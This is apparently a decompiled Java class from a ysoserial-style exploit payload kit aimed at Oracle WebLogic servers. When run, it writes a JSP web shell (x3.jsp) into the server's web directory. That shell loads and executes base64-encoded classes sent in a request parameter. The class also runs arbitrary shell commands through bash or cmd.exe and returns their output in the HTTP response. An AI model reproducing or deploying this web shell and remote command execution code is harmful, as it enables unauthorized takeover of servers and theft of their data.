package ysoserial.payloads.util;

import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import javax.xml.bind.DatatypeConverter;
import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.ServletResponseImpl;

/* loaded from: jar1.jar:myjar/UpJsp.class */
public class UpJsp {
    public void say(String str) throws Exception {
        boolean z = true;
        String property = System.getProperty("os.name");
        if (property != null && property.toLowerCase().contains("win")) {
            z = false;
        }
        ArrayList arrayList = new ArrayList();
        byte[] bytes = "<%@page import=\"javax.xml.bind.*,java.lang.*\"%><%!class U extends ClassLoader{U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}%><%String c = request.getParameter(\"c\");if(null != c)try {new U(this.getClass().getClassLoader()).g(DatatypeConverter.parseBase64Binary(c)).newInstance().equals(pageContext);}catch(Exception e) {}%>".getBytes();
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(Thread.currentThread().getCurrentWork().getContext().getRootTempDir().getAbsolutePath().concat("/war/x3.jsp"));
            fileOutputStream.write(bytes);
            fileOutputStream.close();
        } catch (Exception e) {
        }
        String[] strArr = {"/bin/bash", "-c", "cmd.exe", "/c", DatatypeConverter.printBase64Binary(bytes), "echo ", "x3.jsp"};
        if (str.startsWith("$NO$")) {
            arrayList.add(str.substring(4));
        } else if (z) {
            arrayList.add(strArr[0]);
            arrayList.add(strArr[1]);
            arrayList.add(str);
        } else {
            arrayList.add(strArr[2]);
            arrayList.add(strArr[3]);
            arrayList.add(str);
        }
        try {
            ServletResponseImpl servletResponseImpl = null;
            ServletRequestImpl currentWork = Thread.currentThread().getCurrentWork();
            if (currentWork.getClass().getName().contains("ContainerSupportProviderImpl")) {
                Field declaredField = currentWork.getClass().getDeclaredField("connectionHandler");
                declaredField.setAccessible(true);
                HttpConnectionHandler httpConnectionHandler = (HttpConnectionHandler) declaredField.get(currentWork);
                httpConnectionHandler.getServletRequest().getContext();
                servletResponseImpl = httpConnectionHandler.getServletResponse();
            } else if (currentWork instanceof ServletRequestImpl) {
                ServletRequestImpl servletRequestImpl = currentWork;
                servletResponseImpl = servletRequestImpl.getResponse();
                servletRequestImpl.getContext();
            }
            ProcessBuilder processBuilder = new ProcessBuilder(arrayList);
            processBuilder.redirectErrorStream(true);
            servletResponseImpl.getServletOutputStream().writeStream(processBuilder.start().getInputStream());
            servletResponseImpl.getWriter().write("");
        } catch (Exception e2) {
        }
    }
}
